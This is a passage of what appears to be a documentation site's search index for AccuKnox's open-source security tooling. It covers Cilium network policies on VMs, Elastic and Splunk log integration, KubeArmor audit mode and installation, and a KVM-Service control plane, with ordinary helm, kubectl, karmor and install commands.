fromEndpoints:\n- matchLabels:\nname: vm2\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n</code></pre> The above policy allows ingress traffic to VM with label <code>name: vm1</code> from VM with label <code>name: vm2</code> at only port 80/TCP. All other ingress traffic to VM with <code>name: vm1</code> will be blocked because of this policy.</p> <p>Users can apply polices in the cluster using <code>kubectl</code> just like how resources are managed in k8s usually.</p> <pre><code>kubectl apply -f &lt;yaml-file/url&gt;\n</code></pre> <p>More examples of the network policies and their syntax are available in the official Cilium docs page. </p> <p>Note: For policies that involves VMs, the <code>kind</code> should always be <code>CiliumClusterwideNetworkPolicy</code> </p>"},{"location":"open-source/cilium-vm-k8s/#9-network-observability-in-vms","title":"9. Network Observability in VMs","text":"<p>Users can use <code>hubble</code> CLI tool that comes along with the Cilium installation to monitor network traffic and policy enforcement in VMs. <pre><code>docker exec -it cilium hubble observe -f\n</code></pre></p>"},{"location":"open-source/ciliummatricx/","title":"Cilium Support Matrix","text":"VM Support Provider Distro Support SUSE \u2003 \u2003 \u2003SUSE Enterprise 15 \u2003 \u2003 \u2003 Yes Debian \u2003 \u2003 \u2003Debian 10 (Buster) \u2003 \u2003 \u2003 Yes Debian \u2003 \u2003 \u2003Debian 11 (Bullseye) \u2003 \u2003 \u2003 Yes Canonical \u2003 \u2003 \u2003Ubuntu 18.04 \u2003 \u2003 \u2003 Yes Canonical \u2003 \u2003 \u2003Ubuntu 20.04 \u2003 \u2003 \u2003 Yes Kubernetes Support Provider Distro Support AWS EKS-Ubuntu Server 20.04 LTS Yes K8's Minikube on VirtualBox Yes Canonical MicroK8's Yes Rancher K3's on Ubuntu Yes Google GKE-COS (Rapid/Regular Release) Yes Google GKE-Ubuntu (Rapid/Regular Release) Yes AWS EKS Amazon Linux 2 Yes"},{"location":"open-source/integration/","title":"Elastic and Splunk Integration","text":""},{"location":"open-source/integration/#metrics-and-logs","title":"Metrics and Logs","text":"<ul> <li>The On-Prem Feeder provides the feasibility of pushing the agent logs to Elastic Host using beats and feeder agent.</li> <li>The On-Prem Feeder agent also has the capability of pushing metrics into On Prem Prometheus.</li> <li>Prometheus collects and stores its metrics as time series data i.e., metrics information is stored with the timestamp at which it was recorded, alongside optional <code>key-value</code> pairs called labels.</li> <li>Elasticsearch is a search and analytics engine. It is an open source, full-text search and analysis engine, based on the Apache Lucene search engine.</li> <li>Logstash is a log aggregator that collects data from various input sources, executes different transformations and enhancements and then ships the data to various supported output destinations.</li> <li>Kibana is a visualization layer that works on top of Elasticsearch, providing users with the ability to analyze and visualize the data. And last but not least \u2014 Beats are lightweight agents that are installed on edge hosts to collect different types of data for forwarding into the stack.</li> </ul> <p>The below section explains installation of Feeder Agent , Elastic(Optional) and Prometheus(Optional)</p>"},{"location":"open-source/integration/#1-installation-of-feeder-agent","title":"1. Installation of Feeder Agent","text":"<ul> <li>As we are passing the elastic and kibana resource in the values.yaml of the feeder service , we can toggle the elastic/kibana installation along with feeder-service as below. <pre><code>helm repo add accuknox-onprem-agents https://USERNAME:password@onprem.accuknox.com/repository/accuknox-onprem-agents\nhelm repo update\nhelm search repo accuknox-onprem-agents\n\nkubectl create ns accuknox-feeder-service\nhelm upgrade --install accuknox-eck-operator accuknox-onprem-agents/eck-operator (only if ELK is required)\nhelm upgrade --install accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service\n</code></pre></li> </ul>"},{"location":"open-source/integration/#2-installation-of-elastic","title":"2. Installation of Elastic","text":"<ul> <li>Please enable the elastic resource as <code>true</code> to install Elastic along with feeder. <pre><code>helm upgrade --install --set elasticsearch.enabled=true --set kibana.enabled=true accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service\n</code></pre> Note: If there is ELK set up already running on the cluster, the CRD apply may fail.</li> <li> <p>The Elastic master and data pods should be in up and running state on the same namespace. <li> <p>Additionally the same can be enabled using below command by updating values.yaml <pre><code>elasticsearch:\nenabled: true\n</code></pre></p> </li>"},{"location":"open-source/integration/#3-installation-of-kibana","title":"3. Installation of Kibana","text":"<ul> <li>Please enable the Kibana resource as <code>true</code> to install Kibana along with feeder. <pre><code>helm upgrade --install --set elasticsearch.enabled=true  --set kibana.enabled=true accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service\n</code></pre></li> <li> <p>The Kibana pods should be in up and running state on the same namespace. <li> <p>Additionally the same can be enabled using below command by updating values.yaml <pre><code>kibana:\nenabled: true\n</code></pre></p> </li>"},{"location":"open-source/integration/#4-view-metrics","title":"4. View Metrics","text":"<p> Feeder as a SERVER </p> <ul> <li>Please toggle the below variable for to push metrics directly to an endpoint. <pre><code>GRPC_SERVER_ENABLED\nvalue: true\n```\n- Once the feeder agent starts running, the metrics should start flowing up.\n- Please use `localhost:8000/metrics` endpoint to check metrics flow.\n\n&lt;b&gt; Feeder as a CLIENT&lt;/b&gt;\n\n- Please toggle the below variable for to push metrics to GRPC Server in SAAS Platform.\n```yaml\nGRPC_CLIENT_ENABLED\nvalue: true\nGRPC_SERVER_URL\nvalue: \"localhost\"\nGRPC_SERVER_PORT\nvalue: 8000\n</code></pre></li> <li>Once the feeder agent starts running, the metrics will be pushed to prometheus in SAAS and can be viewed in ACCUKNOX platform UI. Note: All of the above can be updated runtime as in Step 5.5.3</li> </ul>"},{"location":"open-source/integration/#41-installation-of-prometheus-required-only-when-feeder-acts-as-server","title":"4.1 Installation of Prometheus (Required only when Feeder acts as Server)","text":"<p>Please refer the page for Installation of Prometheus.</p>"},{"location":"open-source/integration/#42-prometheus-configurationrequired-only-when-feeder-acts-as-server","title":"4.2 Prometheus Configuration:(Required only when Feeder acts as Server)","text":"<ul> <li>Please add the below configuration in prometheus (on Prem) to see the agent metrics in Prometheus <pre><code>  job_name: &lt;feeder&gt;-chart\nhonor_timestamps: true\nscrape_interval: 30s\nscrape_timeout: 10s\nmetrics_path: /metrics\nscheme: http\nfollow_redirects: true\nstatic_configs:\n- targets:\n- &lt;localhost&gt;:8000\n</code></pre></li> </ul>"},{"location":"open-source/integration/#5-view-logs-in-elastic","title":"5. View Logs in Elastic","text":""},{"location":"open-source/integration/#51-beats-setup","title":"5.1. Beats Setup","text":"<ul> <li>The Beats agent will be spinned along with Filebeat running along as a sidecar.</li> <li> <p>The filebeat configuration file in the package can be updated to specific Elastic instances, and logs can be viewed in Kibana.</p> </li> <li> <p>The logs are forwarded to Elastic when the below env variable is enabled. <pre><code>- name: ELASTIC_FEEDER_ENABLED\nvalue: true\n</code></pre></p> </li> </ul>"},{"location":"open-source/integration/#52-elastic-configuration-parameters","title":"5.2. Elastic Configuration Parameters:","text":"<ul> <li>We will create a ConfigMap named filebeat-configmap with the content of filebeat.yml file. <pre><code>kind: ConfigMap\nmetadata:\nname: filebeat-configmap\ndata:\nfilebeat.yml: |\nfilebeat.inputs:\n- type: log\n\n# Change to true to enable this input configuration.\nenabled: true\n\n# Paths that should be crawled and fetched. Glob based paths.\npaths:\n- /var/log/*.log\noutput.elasticsearch:\nhosts: ${ELASTICSEARCH_HOST}\nusername: ${ELASTICSEARCH_USERNAME}\npassword: ${ELASTICSEARCH_PASSWORD}\nssl.verification_mode: none\n</code></pre></li> <li> <p>The below Configuration parameters can be updated for elastic configuration.</p> <p>(If Default params needs to be modified) <pre><code> - name: ELASTICSEARCH_HOST\nvalue: https://&lt;svc-name&gt;\n- name: ELASTICSEARCH_PORT\nvalue: \"&lt;svc-port&gt;\"\n- name: ELASTICSEARCH_USERNAME\nvalue: \"elastic\"\n- name: ELASTICSEARCH_PASSWORD\nvalue: \"&lt;elastic-password&gt;\"\n</code></pre></p> </li> <li> <p>To get elastic password <pre><code>kubectl get secret elasticsearch-es-elastic-user -o go-template='{{.data.elastic | base64decode}}' -n namespace\n</code></pre></p> </li> </ul>"},{"location":"open-source/integration/#53-updating-elastic-search-host-runtimeif-required-to-switch-different-elastic-host","title":"5.3. Updating Elastic Search Host (Runtime):(If required to switch different Elastic host)","text":"<p><pre><code>kubectl set env deploy/feeder-service -n accuknox-feeder-service  ELASTICSEARCH_HOST=\"https://elasticsearch-es-http.test-feed.svc.cluster.local:9200\" ELASTICSEARCH_USERNAME=elastic ELASTICSEARCH_PASSWORD=xxxxxxxxxx\n</code></pre> - Note: Likewise other configuration parameters can be updated in Runtime.</p>"},{"location":"open-source/integration/#54-validate-log-path","title":"5.4. Validate Log Path:","text":"<ul> <li>To view logs and to check filebeat (status) please use the below command <pre><code>  kubectl exec -it -n accuknox-feeder-service pod/&lt;podname&gt; -c filebeat-sidecar -- /bin/bash\nfilebeat -e\n</code></pre></li> <li>To Update the Log path configured, please modify the below log input path under file beat inputs. <pre><code>filebeat.inputs:\n- type: container\npaths:\n- /log_output/cilium.log\n</code></pre></li> </ul>"},{"location":"open-source/integration/#6-view-logs-in-splunk","title":"6. View Logs in Splunk","text":"<ul> <li>The logs are forwarded to Splunk when the below env variable is enabled. <pre><code>- name: SPLUNK_FEEDER_ENABLED\nvalue: true\n</code></pre></li> <li>The below Configuration parameters can be updated for Splunk configuration. <p>(If Default params needs to be modified) <pre><code> - name: SPLUNK_FEEDER_URL\nvalue: https://&lt;splunk-host&gt;\n- name: SPLUNK_FEEDER_TOKEN\nvalue: \"Token configured on HEC in Splunk App\"\n- name: SPLUNK_FEEDER_SOURCE_TYPE\nvalue: \"Source Type configured on HEC in Splunk App\"\n- name: SPLUNK_FEEDER_SOURCE\nvalue: \"Splunk Source configured on HEC in Splunk App\"\n- name: SPLUNK_FEEDER_INDEX\nvalue: \"Splunk Index configured on HEC in Splunk App\"\n</code></pre></p> </li> </ul>"},{"location":"open-source/integration/#61-enablingdisabling-splunk-runtime","title":"6.1. Enabling/Disabling Splunk (Runtime):","text":"<p><pre><code>kubectl set env deploy/feeder -n feeder-service SPLUNK_FEEDER_ENABLED=\"true\"\n</code></pre> - By enabling the flag to true (as above), the logs will be pushed to Splunk.Conversely disabling it to \"false\" will stop pushing logs. - Note: Likewise other configuration parameters can be updated in Runtime.</p>"},{"location":"open-source/kubearmor-audit/","title":"Using Kubearmor in audit-only mode","text":"<p>KubeArmor allows you to specify Allow policies (aka whitelist policies). Any actions outside of these Allow policies will either be audited or blocked. Currently, the default posture is block.</p> <p>The default posture can be set at:</p> <ol> <li>the global level</li> <li>at individual namespace level</li> </ol>"},{"location":"open-source/kubearmor-audit/#setting-global-posture","title":"Setting Global posture","text":"<p>Global default posture is configured using configuration options passed to KubeArmor using configuration file</p> <pre><code>defaultFilePosture: block # or audit\ndefaultNetworkPosture: block # or audit\ndefaultCapabilitiesPosture: block # or audit\n</code></pre> <p>Or using command line flags with the KubeArmor binary</p> <pre><code>  -defaultFilePosture string\n        configuring default enforcement action in global file context [audit,block] (default \"block\")\n-defaultNetworkPosture string\n        configuring default enforcement action in global network context [audit,block] (default \"block\")\n-defaultCapabilitiesPosture string\n        configuring default enforcement action in global capability context [audit,block] (default \"block\")\n</code></pre>"},{"location":"open-source/kubearmor-audit/#namespace-default-posture","title":"Namespace Default Posture","text":"<p>We use namespace annotations to configure default posture per namespace. Supported annotations keys are <code>kubearmor-file-posture</code>,<code>kubearmor-network-posture</code> and <code>kubearmor-capabilities-posture</code> with values <code>block</code> or <code>audit</code>. If a namespace is annotated with a supported key and an invalid value ( like <code>kubearmor-file-posture=invalid</code>), KubeArmor will update the value with the global default posture ( i.e. to <code>kubearmor-file-posture=block</code>).</p>"},{"location":"open-source/kubearmor-audit/#example","title":"Example","text":"<pre><code>~\u276f\u276f\u276f  kubectl annotate ns multiubuntu kubearmor-file-posture=audit\nnamespace/multiubuntu annotated\n~\u276f\u276f\u276f  kubectl describe ns multiubuntu\nName:         multiubuntu\nLabels:       kubernetes.io/metadata.name=multiubuntu\nAnnotations:  kubearmor-file-posture: audit\nStatus:       Active\n</code></pre>"},{"location":"open-source/kubearmor-install/","title":"KubeArmor: Deployment Guide","text":""},{"location":"open-source/kubearmor-install/#deployment-steps-for-kubearmor-karmor-cli","title":"Deployment Steps for KubeArmor &amp; kArmor CLI","text":""},{"location":"open-source/kubearmor-install/#1-download-and-install-karmor-cli","title":"1. Download and install karmor CLI","text":"<pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre>"},{"location":"open-source/kubearmor-install/#2-install-kubearmor","title":"2. Install KubeArmor","text":"<p><pre><code>karmor install\n</code></pre> It is assumed that the k8s cluster is already present/reachable and the user has rights to create service-accounts and cluster-role-bindings.</p>"},{"location":"open-source/kubearmor-install/#3-deploying-sample-app-and-policies","title":"3. Deploying sample app and policies","text":""},{"location":"open-source/kubearmor-install/#a-deploy-sample-multiubuntu-app","title":"a. Deploy sample multiubuntu app","text":"<pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/master/examples/multiubuntu/multiubuntu-deployment.yaml\n</code></pre>"},{"location":"open-source/kubearmor-install/#b-deploy-sample-policies","title":"b. Deploy sample policies","text":"<p><pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/KubeArmor/master/examples/multiubuntu/security-policies/ksp-group-1-proc-path-block.yaml\n</code></pre> This sample policy blocks execution of <code>sleep</code> command in ubuntu-1 pods.</p>"},{"location":"open-source/kubearmor-install/#c-simulate-policy-violation","title":"c. Simulate policy violation","text":"<p><pre><code>$ kubectl -n multiubuntu exec -it POD_NAME_FOR_UBUNTU_1 -- bash\n# sleep 1\n(Permission Denied)\n</code></pre> Substitute POD_NAME_FOR_UBUNTU_1 with the actual pod name from <code>kubectl get pods -n multiubuntu</code>.</p>"},{"location":"open-source/kubearmor-install/#4-getting-alertstelemetry-from-kubearmor","title":"4. Getting Alerts/Telemetry from KubeArmor","text":""},{"location":"open-source/kubearmor-install/#a-enable-port-forwarding-for-kubearmor-relay","title":"a. Enable port-forwarding for KubeArmor relay","text":"<pre><code>kubectl port-forward -n kube-system svc/kubearmor 32767:32767\n</code></pre>"},{"location":"open-source/kubearmor-install/#b-observing-logs-using-karmor-cli","title":"b. Observing logs using karmor cli","text":"<pre><code>karmor log\n</code></pre>"},{"location":"open-source/kubearmor-install/#k8s-platforms-tested","title":"K8s platforms tested","text":"<ol> <li>Google Kubernetes Engine (GKE) Container Optimized OS (COS)</li> <li>GKE Ubuntu image</li> <li>Amazon Elastic Kubernetes Service (EKS)</li> <li>Self-managed (on-prem) k8s</li> <li>Local k8s engines (microk8s, k3s, minikube)</li> </ol>"},{"location":"open-source/kubearmor-vm/","title":"KubeArmor on VM/Bare-Metal","text":"<p>KubeArmor is a Runtime Security engine that can protect your applications from unknown threats.</p> <p>This recipe explains how to use KubeArmor directly on VM/Bare-Metal host and was tested on Ubuntu hosts. The recipe installs <code>kubearmor</code> as systemd process and <code>karmor</code> cli tool to manage policies and show alerts/telemetry.</p>"},{"location":"open-source/kubearmor-vm/#download-and-install-kubearmor","title":"Download and Install KubeArmor","text":"<ol> <li> <p>Install pre-requisites    <pre><code>sudo apt update &amp;&amp; sudo apt upgrade \\\nsudo apt install bpfcc-tools linux-headers-$(uname -r) \\\nsudo apt install make libelf-dev llvm clang linux-headers-generic\n</code></pre>    Install any of the following packages for bpf-tool depending on your system environment.    <pre><code>sudo apt install linux-intel-iotg-5.15-tools-common\nsudo apt install linux-oem-5.6-tools-common\nsudo apt install linux-tools-common\nsudo apt install linux-iot-tools-common\nsudo apt install linux-tools-gcp\nsudo apt install linux-cloud-tools-gcp\n</code></pre></p> </li> <li> <p>To install Kubearmor copy the whole commands and run it:\\ <pre><code>curl -s https://api.github.com/repos/kubearmor/KubeArmor/releases/latest \\\n| grep \"browser_download_url.*deb\" \\\n| cut -d : -f 2,3 \\\n| tr -d \\\" \\\n| wget -qi -\nsudo dpkg -i kubearmor_*_linux-amd64.deb\n</code></pre></p> </li> </ol>"},{"location":"open-source/kubearmor-vm/#start-kubearmor","title":"Start KubeArmor","text":"<pre><code>sudo systemctl enable kubearmor &amp;&amp; sudo systemctl start kubearmor\n</code></pre> <p>Check kubearmor status using <code>sudo systemctl status kubearmor</code> or use <code>sudo journalctl -u kubearmor -f</code> to continuously monitor kubearmor logs.</p>"},{"location":"open-source/kubearmor-vm/#apply-sample-policy","title":"Apply sample policy","text":"<p>Following policy is to deny execution of <code>sleep</code> binary on the host:</p> sleepdenypolicy.yaml<pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\nname: hsp-kubearmor-dev-proc-path-block\nspec:\nprocess:\nmatchPaths:\n- path: /usr/bin/sleep # try sleep 1\naction:\nBlock\n</code></pre> <p>Save the above policy to <code>sleepdenypolicy.yaml</code></p> <p>To install <code>karmor cli</code> tool: <pre><code>curl -sfL http://get.kubearmor.io/ | sudo sh -s -- -b /usr/local/bin\n</code></pre> Then apply policy: <pre><code>karmor vm policy add sleepdenypolicy.yaml\n</code></pre></p> <p>Now if you run <code>sleep</code> command, the process would be denied execution.</p>"},{"location":"open-source/kubearmor-vm/#get-alerts-for-policies-and-telemetry","title":"Get Alerts for policies and telemetry","text":"<pre><code>karmor log --json\n</code></pre> <pre><code>{\n\"Timestamp\": 1639803960,\n\"UpdatedTime\": \"2021-12-18T05:06:00.077564Z\",\n\"ClusterName\": \"Default\",\n\"HostName\": \"pandora\",\n\"HostPID\": 3390423,\n\"PPID\": 168556,\n\"PID\": 3390423,\n\"UID\": 1000,\n\"PolicyName\": \"hsp-kubearmor-dev-proc-path-block\",\n\"Severity\": \"1\",\n\"Type\": \"MatchedHostPolicy\",\n\"Source\": \"zsh\",\n\"Operation\": \"Process\",\n\"Resource\": \"/usr/bin/sleep\",\n\"Data\": \"syscall=SYS_EXECVE\",\n\"Action\": \"Block\",\n\"Result\": \"Permission denied\"\n}\n</code></pre>"},{"location":"open-source/kubearmormatrix/","title":"KubeArmor Support Matrix","text":"VM Support Provider Distro Support AWS \u2003 \u2003 \u2003Amazon Linux 2 \u2003 \u2003 \u2003 Yes SUSE \u2003 \u2003 \u2003SUSE Enterprise 15 \u2003 \u2003 \u2003 Yes Debian \u2003 \u2003 \u2003Debian 10 (Buster) \u2003 \u2003 \u2003 Yes Debian \u2003 \u2003 \u2003Debian 11 (Bullseye) \u2003 \u2003 \u2003 Yes Canonical \u2003 \u2003 \u2003Ubuntu 18.04 \u2003 \u2003 \u2003 Yes Canonical \u2003 \u2003 \u2003Ubuntu 20.04 \u2003 \u2003 \u2003 Yes Kubernetes Support Provider Distro Support AWS EKS Ubuntu Server 20.04 LTS Yes K8's Minikube on VirtualBox Yes Canonical MicroK8's Yes Rancher K3's on Ubuntu Yes Google GKE-COS (Rapid/Regular Release) Yes Google GKE-Ubuntu (Rapid/Regular Release) Yes AWS EKS Amazon Linux 2 Yes"},{"location":"open-source/kvmservice-nonk8s/","title":"Running Kubearmor/Cilium On VMs Using Non-K8s Control Plane","text":"<p>Kubearmor is a runtime security engine that protects the host/VM from unknown threats. Cilium is a network security engine that can be used to enforce network policy in VMs.   </p> <p>With Kubearmor and Cilium running on a VM, it is possible to enforce host based security policies and secure the VM both at the system and network level.</p>"},{"location":"open-source/kvmservice-nonk8s/#why-we-need-a-control-plane","title":"Why we need a control plane?","text":"<p>With Kubearmor running on multiple VMs, it is difficult and time consuming to enforce policies on each VM. In addition to that, Cilium needs a control plane to distribute information about identities, labels and IPs to the Cilium agents running in multiple VMs.</p> <p>Hence the solution is to manage all the VMs in the network from a control plane.</p>"},{"location":"open-source/kvmservice-nonk8s/#kvm-service","title":"KVM-Service","text":"<p>Accuknox's KVM-Service (Kubearmor Virtual Machine Service) is an application designed to act as a control plane in a non-k8s environment and manage Kubearmor and Cilium running in multiple VMs. Using KVM-Service, users can manage their VMs, associate labels to them and enforce security policies.</p> <p>Note: KVM-Service requires that all the managed VMs should be within the same network.</p>"},{"location":"open-source/kvmservice-nonk8s/#design-of-kvm-service","title":"Design of KVM-Service","text":""},{"location":"open-source/kvmservice-nonk8s/#components-involved-and-its-use","title":"Components Involved and it's use","text":"<ul> <li>Non-K8s Control Plane<ul> <li>etcd : etcd is used as a key-value storage and is used to store the label information, IPs and unique identity of each configured VM.</li> <li>KVM-Service : Manages connection with VM, handles VM onboarding/offboarding, label management and policy enforcement.</li> <li>Karmor (Support utility) : A CLI utility which interacts with KVM-Service for VM onboarding/offboarding, policy enforcement and label management.</li> </ul> </li> <li>VMs : Actual VMs connected in the network</li> </ul>"},{"location":"open-source/kvmservice-nonk8s/#installation-guide","title":"Installation Guide","text":"<p>The following steps describes the process of onboarding VMs and enforcing policies in the VMs using KVM-Service.  1. Install and run KVM-Service and dependencies on a VM (or standalone linux machine). This VM acts as the non-k8s control plane. 2. Onboard the workload VMs 3. Download the VM installation scripts 4. Run the installation scripts 5. Enforce policies in VM from the control plane 6. Manage labels</p> <p>Note : All the steps are tested and carried out in debian based OS distribution.</p>"},{"location":"open-source/kvmservice-nonk8s/#step-1-install-etcd-in-control-plane","title":"Step 1: Install etcd in control plane","text":"<ol> <li> <p>Install etcd using below command <pre><code>sudo apt-get install etcd\n</code></pre> Output: <pre><code>Reading package lists... Done\nBuilding dependency tree       \nReading state information... Done\nThe following NEW packages will be installed:\n  etcd\n0 upgraded, 1 newly installed, 0 to remove and 8 not upgraded.\nNeed to get 2,520 B of archives.\nAfter this operation, 16.4 kB of additional disk space will be used.\nGet:1 http://in.archive.ubuntu.com/ubuntu focal/universe amd64 etcd all 3.2.26+dfsg-6 [2,520 B]\nFetched 2,520 B in 0s (9,080 B/s)\nSelecting previously unselected package etcd.\n(Reading database ... 246471 files and directories currently installed.)\nPreparing to unpack .../etcd_3.2.26+dfsg-6_all.deb ...\nUnpacking etcd (3.2.26+dfsg-6) ...\nSetting up etcd (3.2.26+dfsg-6) ...\n</code></pre></p> </li> <li> <p>Once etcd is installed, configure the following values in <code>/etc/default/etcd</code> as shown below. <pre><code>ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379\nETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379\n</code></pre></p> </li> <li> <p>Restart etcd  <pre><code>sudo service etcd restart\n</code></pre></p> </li> <li> <p>Check the status <pre><code>sudo service etcd status\n</code></pre> Output: <pre><code>\u25cf etcd.service - etcd - highly-available key value store\n     Loaded: loaded (/lib/systemd/system/etcd.service; enabled; vendor preset: enabled)\n     Active: active (running) since Sun 2022-01-16 12:23:58 IST; 30min ago\n       Docs: https://github.com/coreos/etcd\n             man:etcd\n   Main PID: 1087 (etcd)\n      Tasks: 24 (limit: 18968)\n     Memory: 84.2M\n     CGroup: /system.slice/etcd.service\n             \u2514\u25001087 /usr/bin/etcd\n\nJan 16 12:23:57 LEGION etcd[1087]: 8e9e05c52164694d as single-node; fast-forwarding 9 ticks (election ticks 10)\nJan 16 12:23:58 LEGION etcd[1087]: 8e9e05c52164694d is starting a new election at term 88\nJan 16 12:23:58 LEGION etcd[1087]: 8e9e05c52164694d became candidate at term 89\nJan 16 12:23:58 LEGION etcd[1087]: 8e9e05c52164694d received MsgVoteResp from 8e9e05c52164694d at term 89\nJan 16 12:23:58 LEGION etcd[1087]: 8e9e05c52164694d became leader at term 89\nJan 16 12:23:58 LEGION etcd[1087]: raft.node: 8e9e05c52164694d elected leader 8e9e05c52164694d at term 89\nJan 16 12:23:58 LEGION etcd[1087]: published {Name:LEGION ClientURLs:[http://localhost:2379]} to cluster cdf818194e3a8c32\nJan 16 12:23:58 LEGION etcd[1087]: ready to serve client requests\nJan 16 12:23:58 LEGION systemd[1]: Started etcd - highly-available key value store.\nJan 16 12:23:58 LEGION etcd[1087]: serving insecure client requests on 127.0.0.1:2379, this is strongly discouraged!\n</code></pre></p> </li> </ol>"},{"location":"open-source/kvmservice-nonk8s/#step-2-install-kvm-service-in-control-plane","title":"Step 2: Install KVM-Service in control plane","text":"<ol> <li>Clone KVM-Service code and checkout to <code>non-k8s</code> branch.</li> </ol> <p><pre><code>git clone https://github.com/kubearmor/kvm-service.git\n</code></pre> Output: <pre><code>Cloning into 'kvm-service'...\nremote: Enumerating objects: 1252, done.\nremote: Counting objects: 100% (215/215), done.\nremote: Compressing objects: 100% (111/111), done.\nremote: Total 1252 (delta 122), reused 132 (delta 102), pack-reused 1037\nReceiving objects: 100% (1252/1252), 139.62 MiB | 1.70 MiB/s, done.\nResolving deltas: 100% (702/702), done.\n</code></pre> <code>cd</code> into kvm-service directory: <pre><code>cd kvm-service/\n</code></pre> Run this command: <pre><code>git checkout non-k8s\n</code></pre> Output: <pre><code>Branch 'non-k8s' set up to track remote branch 'non-k8s' from 'origin'.\nSwitched to a new branch 'non-k8s'\n</code></pre></p> <ol> <li> <p>Navigate to <code>kvm-service/src/service/</code> and execute the following command to compile KVM-Service code. <pre><code>make\n</code></pre> Output: <pre><code>logname: no login name\ncd /home/wazir/go/src/github.com/kubearmor/kvm-service/src/service; go mod tidy\ncd /home/wazir/go/src/github.com/kubearmor/kvm-service/src/service; go build -ldflags \"-w -s -X main.BuildDate=2022-03-01T10:00:34Z -X main.GitCommit=beb3ab8 -X main.GitBranch=non-k8s -X main.GitState=dirty -X main.GitSummary=beb3ab8\" -o kvmservice main.go\n</code></pre></p> </li> <li> <p>Once compilation is successful, run KVM-Service using the following command. <pre><code>sudo ./kvmservice --non-k8s 2&gt; /dev/null \n</code></pre> Output: <pre><code>2022-01-16 13:06:16.304185      INFO    BUILD-INFO: commit:901ea26, branch: non-k8s, date: 2022-01-16T07:35:51Z, version: \n2022-01-16 13:06:16.304278      INFO    Initializing all the KVMS daemon attributes\n2022-01-16 13:06:16.304325      INFO    Establishing connection with etcd service =&gt; http://localhost:2379\n2022-01-16 13:06:16.333682      INFO    Initialized the ETCD client!\n2022-01-16 13:06:16.333748      INFO    Initiliazing the KVMServer =&gt; podip:192.168.0.14 clusterIP:192.168.0.14 clusterPort:32770\n2022-01-16 13:06:16.333771      INFO    KVMService attributes got initialized\n2022-01-16 13:06:17.333915      INFO    Starting HTTP Server\n2022-01-16 13:06:17.334005      INFO    Starting Cilium Node Registration Observer\n2022-01-16 13:06:17.334040      INFO    Triggered the keepalive ETCD client\n2022-01-16 13:06:17.334077      INFO    Starting gRPC server\n2022-01-16 13:06:17.334149      INFO    ETCD: Getting raw values key:cilium/state/noderegister/v1\n\n2022-01-16 13:06:17.335092      INFO    Successfully KVMServer Listening on port 32770\n</code></pre></p> </li> </ol>"},{"location":"open-source/kvmservice-nonk8s/#step-3-install-karmor-in-control-plane","title":"Step 3: Install karmor in control plane","text":"<p>Run the following command to install karmor utility <pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre></p>"},{"location":"open-source/kvmservice-nonk8s/#step-4-onboard-vms-using-karmor","title":"Step 4: Onboard VMs using karmor","text":"<p>Few example YAMLs are provided under <code>kvm-service/examples</code> for VM onboarding. The same can be used for reference.</p> <p>Lets use <code>kvmpolicy1.yaml</code> and <code>kvmpolicy2.yaml</code> file and onboard two VMs.</p> <p><pre><code>cat kvmpolicy1.yaml \n</code></pre> Output: <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorVirtualMachine\nmetadata:\nname: testvm1\nlabels:\nname: vm1\nvm: true\n</code></pre> Run this command: <pre><code>karmor vm add kvmpolicy1.yaml \n</code></pre> Output: <pre><code>Success\n</code></pre> The above output shows that the first VM is given the name testvm1 and is configured with two labels name:vm1 and vm:true.</p> <p><pre><code>cat kvmpolicy2.yaml \n</code></pre> Output: <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorVirtualMachine\nmetadata:\nname: testvm2\nlabels:\nname: vm2\nvm: true\n</code></pre> Run this command: <pre><code>karmor vm add kvmpolicy2.yaml\n</code></pre> Output: <pre><code>Success\n</code></pre> The above output shows that the second VM is given the name testvm2 and is configured with two labels name:vm1 and vm:true. </p> <p>When a new VM is onboarded, the KVM-Service assigns a new identity to it. To see the list of onboarded VMs, execute the following the command. <pre><code>karmor vm list\n</code></pre> Output: <pre><code>List of configured vms are : \n[ VM : testvm1, Identity : 1090 ]\n[ VM : testvm2, Identity : 35268 ]\n</code></pre></p>"},{"location":"open-source/kvmservice-nonk8s/#step-5-generate-installation-scripts-for-configured-vms","title":"Step 5: Generate installation scripts for configured VMs","text":"<p>Generate VM installation scripts for the configured VM <pre><code>karmor vm --kvms getscript -v testvm1\n</code></pre> Output: <pre><code>VM installation script copied to testvm1.sh\n</code></pre> Run this command: <pre><code>karmor vm --kvms getscript -v testvm2\n</code></pre> Output: <pre><code>VM installation script copied to testvm2.sh\n</code></pre></p>"},{"location":"open-source/kvmservice-nonk8s/#step-6-execute-the-installation-script-in-vms","title":"Step 6: Execute the installation script in VMs","text":"<p>Copy the generated installation scripts to appropriate VMs and execute the scripts to run Kubearmor and Cilium.</p> <p>The script downloads Kubearmor and Cilium Docker images and run them as containers in each VM. Kubearmor and Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies. </p>"},{"location":"open-source/kvmservice-nonk8s/#step-7-apply-and-verify-kubearmor-system-policy","title":"Step 7: Apply and verify Kubearmor system policy","text":"<ol> <li>Few example YAMLs are provided under <code>kvm-service/examples</code> for Kubearmor policy enforcement in VM. The same can be used for reference.</li> </ol> <p><pre><code>cat khp-example-vmname.yaml\n</code></pre> Output: <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorHostPolicy\nmetadata:\nname: khp-02\nspec:\nnodeSelector:\nmatchLabels:\nname: vm1\nseverity: 5\nfile:\nmatchPaths:\n- path: /proc/cpuinfo\naction:\nBlock\n</code></pre> Run this command: <pre><code>karmor vm --kvms policy add khp-example-vmname.yaml\n</code></pre> Output: <pre><code>Success\n</code></pre> 2. To verify the enforced policy in 